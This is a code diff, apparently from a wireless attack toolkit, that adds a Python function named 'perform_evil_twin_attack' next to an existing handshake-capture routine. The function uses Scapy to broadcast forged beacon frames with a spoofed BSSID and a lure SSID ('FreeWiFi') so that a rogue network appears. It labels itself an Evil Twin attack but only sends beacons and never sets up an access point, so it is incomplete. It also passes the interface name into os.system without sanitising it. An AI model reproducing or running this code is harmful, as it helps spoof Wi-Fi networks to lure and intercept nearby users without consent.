@@ -95,3 +95,28 @@ def perform_handshake_capture(interface='wlan0', channel=1, timeout=60):
         # Reset the channel back to the original value
         os.system(f"iwconfig {interface} channel 1")
         print("Capture finished. Handshakes (if any) should be saved.")
+        
+def perform_evil_twin_attack(interface='wlan0', ssid='FreeWiFi', channel=1):
+    """
+    Perform an Evil Twin attack by creating a rogue access point.
+
+    :param interface: Network interface to use (e.g., 'wlan0').
+    :param ssid: SSID for the fake access point.
+    :param channel: Channel to use for the fake access point.
+    """
+    print(f"Starting Evil Twin attack with SSID '{ssid}' on interface '{interface}' at channel {channel}...")
+    
+    os.system(f"iwconfig {interface} channel {channel}")
+    
+    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='12:34:56:78:9a:bc', addr3='12:34:56:78:9a:bc')
+    beacon = Dot11Beacon()
+    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
+    
+    frame = RadioTap()/dot11/beacon/essid
+    
+    try:
+        while True:
+            sendp(frame, iface=interface, inter=0.1, loop=1)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("Evil Twin attack stopped.")
